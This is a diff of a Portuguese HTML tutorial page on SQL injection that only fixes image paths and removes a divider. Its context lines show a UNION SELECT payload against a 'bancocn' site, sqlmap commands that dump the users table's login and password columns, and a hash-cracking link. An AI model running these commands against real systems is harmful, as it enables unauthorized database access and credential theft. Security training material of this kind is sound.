@@ -58,7 +58,6 @@ www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(id, " ", login, " 
             <h4>Remover criptografia MD5</h4>
             <p id="textoPost">Site https://hashes.com/en/decrypt/hash</p>
             <br>
-            <hr>
             <h4>Sqlmap</h4>
 <small><pre id="codigo"><code>
 sqlmap -u http://www.bancocn.com/cat.php?id=3 --dbs --dbms=mysql
@@ -67,11 +66,11 @@ sqlmap -u http://www.bancocn.com/cat.php?id=3 --dbs --dbms=mysql
 <small><pre id="codigo"><code>
 sqlmap -r lista.txt --dbs --dbms=mysql
 </code></pre></small>
-            <img src="anexos/sqlInjection/header.png" width="800px" class="img-fluid">
+            <img src="../anexos/sqlInjection/header.png" width="800px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/listatxt.png" width="400px" class="img-fluid">
+            <img src="../anexos/sqlInjection/listatxt.png" width="400px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/sqlmap.png" width="400px" class="img-fluid">
+            <img src="../anexos/sqlInjection/sqlmap.png" width="400px" class="img-fluid">
             <br><br>
 <small><pre id="codigo"><code>
 <b>Nome das tables:</b>
@@ -81,11 +80,11 @@ sqlmap -r lista.txt --dbms=mysql -D bancocn -T users --columns
 <b>Dados das columns:</b>
 sqlmap -r lista.txt --dbms=mysql -D bancocn -T users -C login,password --dump
 </code></pre></small>
-            <img src="anexos/sqlInjection/sqlmap2.png" width="400px" class="img-fluid">
+            <img src="../anexos/sqlInjection/sqlmap2.png" width="400px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/sqlmap3.png" width="400px" class="img-fluid">
+            <img src="../anexos/sqlInjection/sqlmap3.png" width="400px" class="img-fluid">
             <br><br>
-            <img src="anexos/sqlInjection/sqlmap4.png" width="400px" class="img-fluid">
+            <img src="../anexos/sqlInjection/sqlmap4.png" width="400px" class="img-fluid">
             <br><br>
         </div>
     </div>
